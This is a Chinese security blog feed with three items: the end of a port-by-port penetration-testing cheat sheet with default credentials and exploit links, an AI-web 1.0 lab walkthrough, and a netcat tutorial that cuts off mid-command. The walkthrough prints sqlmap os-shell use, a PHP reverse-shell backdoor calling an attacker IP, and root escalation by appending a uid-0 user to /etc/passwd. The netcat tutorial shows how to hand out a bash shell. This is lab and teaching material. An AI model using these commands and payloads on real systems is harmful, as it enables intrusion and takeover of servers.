href="http://www.wooyun.org/bugs/wooyun-2010-0109008" target="_blank" rel="noopener">中国某大型金融机构地方业务弱口令导致数万商户信息泄露&amp;访问Lotus Domino后台</a></p><h4 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h4><p>针对所有的数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p><h5 id="MYSQL数据库"><a href="#MYSQL数据库" class="headerlink" title="MYSQL数据库"></a>MYSQL数据库</h5><p>默认端口：3306</p><p>攻击方式：</p><p>爆破：弱口令</p><p>身份认证漏洞：<a href="http://www.freebuf.com/vuls/3815.html" target="_blank" rel="noopener">CVE-2012-2122</a></p><p>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</p><p>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</p><p>案例分享：</p><p><a href="https://www.seebug.org/appdir/MySQL" target="_blank" rel="noopener">漏洞分享</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0115534/" target="_blank" rel="noopener">和讯网某站点存在mysql注入漏洞</a></p><p><a href="http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390" target="_blank" rel="noopener">MySQL提权总结</a></p><h5 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h5><p>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</p><p>攻击方式：</p><p>爆破：弱口令/使用系统用户</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/1620" target="_blank" rel="noopener">MSSQL注射总结</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0102404" target="_blank" rel="noopener">上海安脉综合管理系统mssql注射漏洞</a></p><p><a href="http://drops.wooyun.org/tips/1067" target="_blank" rel="noopener">解密MSSQL连接数据库密码</a></p><p><a href="http://www.freebuf.com/articles/database/22997.html" target="_blank" rel="noopener">从攻击MSSQL到提权</a>: 使用msf针对mssql的一次完整渗透</p><h5 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h5><p>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p><p>攻击方式：</p><p>爆破：弱口令</p><p>注入攻击；</p><p>漏洞攻击；</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/papers/6035" target="_blank" rel="noopener">Oracle盲注结合XXE漏洞远程获取数据</a></p><h5 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h5><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；<a href="http://lcx.cc/?i=1275" target="_blank" rel="noopener">浅谈postgresql数据库攻击技术</a> 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p><p>默认端口：5432</p><p>攻击方式：</p><p>爆破：弱口令：postgres postgres</p><p>缓冲区溢出：CVE-2014-2669</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/6449" target="_blank" rel="noopener">Hacking postgresql</a></p><p><a href="http://zone.wooyun.org/content/4971" target="_blank" rel="noopener">关于postgresql的那些事</a></p><h5 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h5><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：<a href="http://drops.wooyun.org/运维安全/2470" target="_blank" rel="noopener">请参考</a></p><p>默认端口：27017</p><p>攻击方式：</p><p>爆破：弱口令</p><p>未授权访问；github有攻击代码；<a href="https://github.com/yangbh/Hammer/blob/master/plugins/System/mongodb_unauth_access.py" target="_blank" rel="noopener">请点击</a></p><p>案例分享：</p><p><a href="http://bobao.360.cn/learning/detail/274.html" target="_blank" rel="noopener">MongoDB phpMoAdmin远程代码执行</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2013-047153" target="_blank" rel="noopener">搜狐MongoDB未授权访问</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2014-066883" target="_blank" rel="noopener">新浪微米未授权访问</a></p><p><a href="http://drops.wooyun.org/运维安全/2470" target="_blank" rel="noopener">解决MongoDB各种隐患问题</a></p><h5 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h5><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt" target="_blank" rel="noopener">https://yunpan.cn/cYjzHxawFpyVt</a> 访问密码 e547</p><p>默认端口：6379</p><p>攻击方式：</p><p>爆破：弱口令</p><p>未授权访问+配合ssh key提权；</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0152710/" target="_blank" rel="noopener">中国铁建网redis+ssh-keygen免认证登录</a></p><h5 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h5><p>默认端口：服务端口5000；监听端口4100；备份端口：4200</p><p>攻击方式：</p><p>爆破：弱口令</p><p>命令注入：</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-083132" target="_blank" rel="noopener">广西自考信息系统Sybase数据库注入</a></p><p><a href="http://www.venustech.com.cn/NewsInfo/124/22061.Html" target="_blank" rel="noopener">Sybase EAServer命令注入漏洞</a></p><h5 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h5><p>默认端口：5000</p><p>攻击方式：</p><p>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0113071" target="_blank" rel="noopener">哈尔滨银行主站DB2注入</a></p><p>总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p><p>顺便提一下：很多时候银行企业采用的都是oracle、db2等大型数据库；</p><h3 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h3><h5 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h5><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p><p>默认端口：25（smtp）、465（smtps）</p><p>攻击方式：</p><p>爆破：弱口令</p><p>未授权访问</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-025810" target="_blank" rel="noopener">腾讯邮箱smtp注册时间限制绕过漏洞</a></p><p><a href="http://drops.wooyun.org/papers/534" target="_blank" rel="noopener">邮件伪造详解</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2011-03388" target="_blank" rel="noopener">qq邮箱伪造发件地址，容易被钓鱼利用</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-098813" target="_blank" rel="noopener">众多厂商邮件系统配置不当可伪造邮件人</a></p><h5 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h5><p>默认端口：109（POP2）、110（POP3）、995（POP3S）</p><p>攻击方式：</p><p>爆破；弱口令</p><p>未授权访问；</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bug.php?action=view&id=147087" target="_blank" rel="noopener">中国联通沃邮箱等部分Android客户端免密码登陆（可获取任意联通用户pop3密码）</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2011-094877" target="_blank" rel="noopener">中航信邮箱密码泄漏及VPN账号和大量邮箱弱口令导致可内网漫游拿到域控</a></p><h5 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h5><p>默认端口：143（imap）、993（imaps）</p><p>攻击方式：</p><p>爆破：弱口令</p><p>配置不当</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-022037" target="_blank" rel="noopener">163邮箱二次验证饶过缺陷</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-045426" target="_blank" rel="noopener">南方周末邮件服务器任意文件读取漏洞</a></p><h4 id="网络常见协议端口渗透"><a href="#网络常见协议端口渗透" class="headerlink" title="网络常见协议端口渗透"></a>网络常见协议端口渗透</h4><h5 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h5><p>默认端口：53</p><p>攻击方式：</p><p>区域传输漏洞</p><p>见2中的总结</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2014-061403" target="_blank" rel="noopener">全球Top1000Websites中存在DNS区域传送漏洞的网站列表</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0132048" target="_blank" rel="noopener">团购王某站DNS域传送漏洞</a></p><p><a href="http://drops.wooyun.org/tips/1354" target="_blank" rel="noopener">DNS泛解析与内容投毒</a></p><h5 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h5><p>默认端口：67&amp;68、546（DHCP Failover做双机热备的）</p><p>攻击方式：</p><p>DHCP劫持；</p><p>见2中总结</p><p>案例分享：</p><p><a href="http://www.freebuf.com/articles/network/74995.html" target="_blank" rel="noopener">流氓DHCP服务器内网攻击测试</a></p><h5 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h5><p>默认端口：161</p><p>攻击方式:</p><p>爆破：弱口令</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/409" target="_blank" rel="noopener">snmp弱口令引起的信息泄漏</a></p><p><a href="http://drops.wooyun.org/tips/2106" target="_blank" rel="noopener">基于snmp的反射攻击的理论及其实现</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-081037" target="_blank" rel="noopener">华为某服务器SNMP弱口令</a></p><h4 id="其他端口渗透"><a href="#其他端口渗透" class="headerlink" title="其他端口渗透"></a>其他端口渗透</h4><h5 id="Hadoop文件服务"><a href="#Hadoop文件服务" class="headerlink" title="Hadoop文件服务"></a>Hadoop文件服务</h5><p>默认端口：<a href="http://hsrong.iteye.com/blog/1374734" target="_blank" rel="noopener">请参考</a></p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-020282" target="_blank" rel="noopener">Apache Hadoop远程命令执行</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2013-022434" target="_blank" rel="noopener">新浪漏洞系列第六弹–大量hadoop应用对外访问</a></p><h5 id="Zookeeper服务"><a href="#Zookeeper服务" class="headerlink" title="Zookeeper服务"></a>Zookeeper服务</h5><p>zookeeper：分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。详情请参考百度百科</p><p>默认端口：2181</p><p>攻击方式：</p><p>未授权访问；</p><p>案例分享：</p><p><a href="http://tangscan.com/plugin/17261" target="_blank" rel="noopener">zookeeper未授权访问漏洞</a></p><p>网上关于这方面的案例暂时不多，但是对于大数据逐渐泛滥的今天，这些漏洞未来会在乌云上出现一大波！</p><h5 id="Zabbix服务"><a href="#Zabbix服务" class="headerlink" title="Zabbix服务"></a>Zabbix服务</h5><p>zabbix：基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p><p>默认端口：8069</p><p>攻击方式：</p><p>远程命令执行：</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/68" target="_blank" rel="noopener">当渗透遇到zabbix–小谈zabbix安全</a></p><p><a href="http://www.secpulse.com/archives/2089.html" target="_blank" rel="noopener">Zabbix的前台SQL注射漏洞利用</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2013-025219" target="_blank" rel="noopener">网易zabbix运维不当，导致任意命令执行。(可提权、可内网渗透)</a></p><h5 id="elasticsearch服务"><a href="#elasticsearch服务" class="headerlink" title="elasticsearch服务"></a>elasticsearch服务</h5><p>elasticsearch：请百度（因为我觉得我解释不清楚）</p><p>默认端口：9200（）、9300（）</p><p>攻击方式：</p><p>未授权访问；</p><p>远程命令执行；</p><p>文件遍历；</p><p>低版本webshell植入；</p><p>案例分享：</p><p><a href="http://www.secpulse.com/archives/5401.html" target="_blank" rel="noopener">ElasticSearch 远程代码执行漏洞</a></p><p><a href="http://www.freebuf.com/tools/38025.html" target="_blank" rel="noopener">elasticsearch 漏洞利用工具</a></p><h5 id="memcache服务"><a href="#memcache服务" class="headerlink" title="memcache服务"></a>memcache服务</h5><p>默认端口：11211</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/papers/865" target="_blank" rel="noopener">Memcache安全配置</a></p><p><a href="https://help.aliyun.com/knowledge_detail/6936805.html" target="_blank" rel="noopener">memcache 未授权访问漏洞</a></p><h5 id="Linux-R服务"><a href="#Linux-R服务" class="headerlink" title="Linux R服务"></a>Linux R服务</h5><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><table><thead><tr><th><strong>端口号</strong></th><th><strong>端口说明</strong></th><th><strong>攻击技巧</strong></th></tr></thead><tbody><tr><td><strong>21/22/69</strong></td><td><strong>ftp/tftp</strong> <strong>：文件传输协议</strong></td><td><strong>爆破</strong> <strong>嗅探</strong> <strong>溢出；后门</strong></td></tr><tr><td><strong>22</strong></td><td><strong>ssh</strong> <strong>：远程连接</strong></td><td><strong>爆破</strong> <strong>OpenSSH</strong> <strong>；28个退格</strong></td></tr><tr><td><strong>23</strong></td><td><strong>telnet</strong>  <strong>：远程连接</strong></td><td><strong>爆破</strong> <strong>嗅探</strong></td></tr><tr><td><strong>25</strong></td><td><strong>smtp</strong> <strong>：邮件服务</strong></td><td><strong>邮件伪造</strong></td></tr><tr><td><strong>53</strong></td><td><strong>DNS</strong> <strong>：域名系统</strong></td><td><strong>DNS区域传输</strong> <strong>0.00DNS劫持DNS缓存投毒DNS欺骗深度利用：利用DNS隧道技术刺透防火墙</strong></td></tr><tr><td><strong>67/68</strong></td><td><strong>dhcp</strong></td><td><strong>劫持</strong> <strong>欺骗</strong></td></tr><tr><td><strong>110</strong></td><td><strong>pop3</strong></td><td><strong>爆破</strong></td></tr><tr><td><strong>139</strong></td><td><strong>samba</strong></td><td><strong>爆破</strong>     <strong>未授权访问  远程代码执行</strong></td></tr><tr><td><strong>143</strong></td><td><strong>imap</strong></td><td><strong>爆破</strong></td></tr><tr><td><strong>161</strong></td><td><strong>snmp</strong></td><td><strong>爆破</strong></td></tr><tr><td><strong>389</strong></td><td><strong>ldap</strong></td><td><strong>注入攻击</strong> <strong>未授权访问</strong></td></tr><tr><td><strong>512/513/514</strong></td><td><strong>linux r</strong></td><td><strong>直接使用</strong> <strong>rlogin</strong></td></tr><tr><td><strong>873</strong></td><td><strong>rsync</strong></td><td><strong>未授权访问</strong></td></tr><tr><td><strong>1080</strong></td><td><strong>socket</strong></td><td><strong>爆破：进行内网渗透</strong></td></tr><tr><td><strong>1352</strong></td><td><strong>lotus</strong></td><td><strong>爆破：弱口令</strong> <strong>信息泄漏：源代码</strong></td></tr><tr><td><strong>1433</strong></td><td><strong>mssql</strong></td><td><strong>爆破：使用系统用户登录</strong> <strong>注入攻击</strong></td></tr><tr><td><strong>1521</strong></td><td><strong>oracle</strong></td><td><strong>爆破：</strong> <strong>TNS</strong>  <strong>注入攻击</strong></td></tr><tr><td><strong>2049</strong></td><td><strong>nfs</strong></td><td><strong>配置不当</strong></td></tr><tr><td><strong>2181</strong></td><td><strong>zookeeper</strong></td><td><strong>未授权访问</strong></td></tr><tr><td><strong>3306</strong></td><td><strong>mysql</strong></td><td><strong>爆破</strong> <strong>拒绝服务</strong> <strong>注入</strong></td></tr><tr><td><strong>3389</strong></td><td><strong>rdp</strong></td><td><strong>爆破</strong> <strong>Shift</strong> <strong>后门</strong></td></tr><tr><td><strong>4848</strong></td><td><strong>glassfish</strong></td><td><strong>爆破：控制台弱口令</strong> <strong>认证绕过</strong></td></tr><tr><td><strong>5000</strong></td><td><strong>sybase/DB2</strong></td><td><strong>爆破</strong> <strong>注入</strong></td></tr><tr><td><strong>5432</strong></td><td><strong>postgresql</strong></td><td><strong>缓冲区溢出</strong> <strong>注入攻击</strong> <strong>爆破：弱口令</strong></td></tr><tr><td><strong>5632</strong></td><td><strong>pcanywhere</strong></td><td><strong>拒绝服务</strong> <strong>代码执行</strong></td></tr><tr><td><strong>5900</strong></td><td><strong>vnc</strong></td><td><strong>爆破：弱口令</strong> <strong>认证绕过</strong></td></tr><tr><td><strong>6379</strong></td><td><strong>redis</strong></td><td><strong>未授权访问</strong> <strong>爆破：弱口令</strong></td></tr><tr><td><strong>7001</strong></td><td><strong>weblogic</strong></td><td><strong>Java</strong> <strong>反序列化</strong> <strong>控制台弱口令</strong> <strong>控制台部署</strong> <strong>webshell</strong></td></tr><tr><td><strong>80/443/8080</strong></td><td><strong>web</strong></td><td><strong>常见</strong> <strong>web</strong> <strong>攻击</strong> <strong>控制台爆破</strong> <strong>对应服务器版本漏洞</strong></td></tr><tr><td><strong>8069</strong></td><td><strong>zabbix</strong></td><td><strong>远程命令执行</strong></td></tr><tr><td><strong>9090</strong></td><td><strong>websphere</strong> <strong>控制台</strong></td><td><strong>爆破：控制台弱口令</strong> <strong>Java</strong> <strong>反序列</strong></td></tr><tr><td><strong>9200/9300</strong></td><td><strong>elasticsearch</strong></td><td><strong>远程代码执行</strong></td></tr><tr><td><strong>11211</strong></td><td><strong>memcacache</strong></td><td><strong>未授权访问</strong></td></tr><tr><td><strong>27017</strong></td><td><strong>mongodb</strong></td><td><strong>爆破</strong> <strong>未授权访问</strong></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AI-web1.0靶机学习</title>
      <link href="/2020/03/12/ai-web1-0-ba-ji-xue-xi/"/>
      <url>/2020/03/12/ai-web1-0-ba-ji-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="AI-web-1-0靶机学习"><a href="#AI-web-1-0靶机学习" class="headerlink" title="AI-web 1.0靶机学习"></a>AI-web 1.0靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们尝试使用nmap的二层发现功能进行主机扫描</p><pre><code>nmap -sn 192.168.153.0/24 </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt=""></p><h4 id="第二步、端口扫描"><a href="#第二步、端口扫描" class="headerlink" title="第二步、端口扫描"></a>第二步、端口扫描</h4><p>我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。</p><pre><code>nmap -A -p 1-65535 192.168.153.135 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185240.png" alt=""></p><p>我们发现靶机的80端口上运行apache服务，并且发现了一个文件上传的目录</p><p>我们尝试访问该ip的80端口,发现页面只有一句没什么用的话。。。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185640.png" alt=""></p><h4 id="第三步、web信息收集"><a href="#第三步、web信息收集" class="headerlink" title="第三步、web信息收集"></a>第三步、web信息收集</h4><p>我们使用dirsearch工具尝试扫一下网站的目录。</p><pre><code>dirb http://192.168.153.135</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185739.png" alt=""></p><p>发现目录下存在robots.txt文件，我们看看里面有没有什么敏感文件。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185821.png" alt=""></p><p>文件里给出了三个目录，我们依次进行访问，发现只有 /se3reTdir777/目录可以正常访问，发现是一个登陆点。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190345.png" alt=""></p><p>我们输入任意数字，进行抓包判断，发现明显的注入点uid。使用sqlmap进行自动化扫描。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190358.png" alt=""></p><h4 id="第四步、sqlmap自动化注入"><a href="#第四步、sqlmap自动化注入" class="headerlink" title="第四步、sqlmap自动化注入"></a>第四步、sqlmap自动化注入</h4><p>我们使用sqlmap进行自动化扫描。</p><pre><code>python sqlmap.py -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;peration=Submit&quot; --dbs --batch</code></pre><p>得到了我们想要的数据库 aiweb1</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190647.png" alt=""></p><p>继续对目标数据库中的表进行探测</p><pre><code>python sqlmap.py -u &quot;http:192.168.153.135/se3reTdir777/&quot;--data &quot;uid=1&amp;peration=Submit&quot; -D  aiweb1 --tables --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190733.png" alt=""></p><p>探测字段</p><pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 -T user --columns --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190849.png" alt=""></p><p>发现没有我们想要的信息。。。。。。只能换思路。</p><h4 id="第五步、sqlmap反弹shell"><a href="#第五步、sqlmap反弹shell" class="headerlink" title="第五步、sqlmap反弹shell"></a>第五步、sqlmap反弹shell</h4><p>我们发现之前robots下存在一个 /m3diNf0/ 目录禁止访问，我们这里再次对其进行爆破。</p><pre><code>dirb http://192.168.153.135/m3diNf0/ </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215110747.png" alt=""></p><p>我们发现目录下存在一个info.php，我们尝试对其进行访问。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206192302.png" alt=""></p><p>发现这是一个phpinfo配置页面。并且在其中发现了网站的根目录在home下。</p><p>知道了网站的根目录，我们就可以尝试使用sqlmap反弹shell。</p><pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --level=3 --os-shell</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215112454.png" alt=""></p><p>依次选择4:php web server</p><p>​                2:custom location</p><p>网站路径：/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</p><p>​                PS：优先选择此路径的原因是sql注入在该页面下。</p><h4 id="第六步、php后门反弹shell"><a href="#第六步、php后门反弹shell" class="headerlink" title="第六步、php后门反弹shell"></a>第六步、php后门反弹shell</h4><p>​    提示需要一个终端，所以我们得想办法反弹一个shell。在这里我们已经得到一个shell，可以写一个后门，在这里写一个php后门。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$sock</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"192.168.153.152"</span><span class="token punctuation">,</span><span class="token number">4567</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>我们尝试访问本地的127.0.0.1的4567端口。发现可以正常访问目录下的文件。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215114220.png" alt=""></p><p>我们在shell下载下a.php文件。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215114406.png" alt=""></p><p>我们在kali下监听 9966端口。</p><pre><code>nc -lvp 9966</code></pre><p>然后我们在使用php命令运行我们下载的php后门。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215114646.png" alt=""></p><p>我们可以发现kali已经成功反弹shell。</p><h4 id="第七步、提权获得flag"><a href="#第七步、提权获得flag" class="headerlink" title="第七步、提权获得flag"></a>第七步、提权获得flag</h4><p>我们首先使用ptthon提升为交互式shell:</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>​    发现当前用户不是root用户但是这个用户可以对/etc/passwd 文件进行写入权限，所以我们试着添加一个用户看看： 因为写入的时候密码是加密的，所以要先加密密码:</p><pre><code>openssl passwd -1 -salt abc 000000</code></pre><p>再写入密码：</p><pre><code>echo &#39;abc&#39;:$1$abc$yzqAxwzjwao0BUFj9nRwF/:0:0::/root：/bin/bash&#39;&gt;&gt;/etc/passwd</code></pre><p>最后使用su命令切换为root用户。得到Flag.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215115210.png" alt=""></p><p><strong>完</strong></p>]]></content>
      
      
      <categories>
          
          <category> 靶机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI-web 1.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——被动信息收集</title>
      <link href="/2020/03/12/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji/"/>
      <url>/2020/03/12/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——基本工具</title>
      <link href="/2020/03/12/shen-tou-ce-shi-ji-ben-gong-ju/"/>
      <url>/2020/03/12/shen-tou-ce-shi-ji-ben-gong-ju/</url>
      
        <content type="html"><![CDATA[<h3 id="渗透测试——基本工具"><a href="#渗透测试——基本工具" class="headerlink" title="渗透测试——基本工具"></a>渗透测试——基本工具</h3><h4 id="一、NETCAT（nc"><a href="#一、NETCAT（nc" class="headerlink" title="一、NETCAT（nc)"></a>一、NETCAT（nc)</h4><ul><li>网络工具中的瑞士军刀（小身材、大智慧）</li><li>侦听模式/传输模式</li><li>telent/获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件</li><li>远程控制/木马</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><p><strong>NC（TELNET/BANNER功能）</strong></p><ul><li>nc -nv 1.1.1.1 110</li><li>nc -nv 1.1.1.1 25</li><li>nc -nv 1.1.1.1 80</li></ul><p>nc作为客户端时，可以对服务器端进行侦听</p><p><strong>示例：</strong></p><p>ping pop3.163.com  #查看163邮箱pop3的IP地址</p><p>nc -nv 123.125.50.29 110 #n只跟IP地址，不对DNS地址进行解析；v显示详细输出信息；参数后面跟                                                服务IP和端口</p><p>user   邮箱用户名（base64编码）   邮箱密码（base64编码）</p><p>通过以上命令可以在命令行下接受邮件。</p><h5 id="NC（传输文本信息）"><a href="#NC（传输文本信息）" class="headerlink" title="NC（传输文本信息）"></a><strong>NC（传输文本信息）</strong></h5><p><strong>示例</strong>：</p><p>服务器端：nc -l -p 3333  #-l 表示侦听 -p指定打开的端口号</p><p>​                   netstat -pantu | grep 3333 #查看3333端口是否打开</p><p>客户端： nc -nv 192.168.1.132 3333 #参数后面跟服务器的IP地址和开放的端口。</p><h5 id="NC（远程电子取证信息收集"><a href="#NC（远程电子取证信息收集" class="headerlink" title="NC（远程电子取证信息收集)"></a><strong>NC（远程电子取证信息收集)</strong></h5><p><strong>示例1：</strong></p><p>A对B当前目录信息进行取证</p><p>A：nc -l -p 3333 #-l表示侦听 -p指定打开的端口号 A对3333端口开始侦听</p><p>B：ls -l | nc -nv 192.168.153.132 3333 #将当前目录下的文件属性列表信息传递给A。</p><p><strong>示例2：</strong></p><p>A对B当前系统进程信息进行取证并存档</p><p>A:nc -l -p 3333&gt;ps.txt #侦听3333端口，并把侦听内容重定向到当前目录的1.txt文件里</p><p>B:ps aux | nc -nv 192.168.153.132 -q 1 #将当前系统进程信息进行取证并存档到1.txt中  -q表示自动                                                                        断开nc连接</p><p>A:cat ps.txt #查看ps.txt文件内容</p><p>远程电子取证信息收集尽量少的去对目标机器进行修改。</p><h5 id="NC（传输文件）"><a href="#NC（传输文件）" class="headerlink" title="NC（传输文件）"></a><strong>NC（传输文件）</strong></h5><p><strong>正向文件运输</strong></p><p>A：mc -l -p 3333&gt;1.mp4 #侦听端为文件接受端，接受对方3333端口发送的文件并命名为1.mp4</p><p>B：nc -nv 192.168.153.132 3333 &lt;1.mp4 -q 1 #文件发送端</p><p><strong>反向文件运输</strong></p><p>A: nc -lp 3333&lt; 1.mp4 -q 1 #侦听端为文件发送端，将1.mp4这个文件放在3333侦听端口上等待对方接收</p><p>B: nc -nv 192.168.0.5 3333&gt; 1.mp4  #文件接收端</p><h5 id="NC（传输目录）"><a href="#NC（传输目录）" class="headerlink" title="NC（传输目录）"></a><strong>NC（传输目录）</strong></h5><h5 id="NC（流媒体服务"><a href="#NC（流媒体服务" class="headerlink" title="NC（流媒体服务)"></a><strong>NC（流媒体服务)</strong></h5><p><strong>示例：</strong></p><p>A：cat 1.mp4 | nc -l -p 3333  #A端为流媒体输出端，将1.mp4这个文件打开并通过3333端口进行输                                                        出</p><p>B：nc -nv 192.168.153.130 | mplayer -vo x11 -cache 3000 #B端为流媒体客户端，将侦听A端3333                    端口，并通过mplayer媒体播放器进行播放，设定缓存为3000K</p><h5 id="NC（端口扫描）"><a href="#NC（端口扫描）" class="headerlink" title="NC（端口扫描）"></a><strong>NC（端口扫描）</strong></h5><p><strong>示例：</strong></p><p>nc -nvz 192.168.153.130 1-65535 #扫描目标主机TCP 1-65535开放的端口</p><p>nc -nvzu 192.168.153.130 1-65535 #扫描目标主机UDP 1-1024开放的端口</p><h5 id="NC（远程控制）"><a href="#NC（远程控制）" class="headerlink" title="NC（远程控制）"></a><strong>NC（远程控制）</strong></h5><p>服务器端开启远程控制：</p><p>服务器：nc -lp port -c bash#把shell交给过来连接的客户端</p><p>客户端：nc -nv 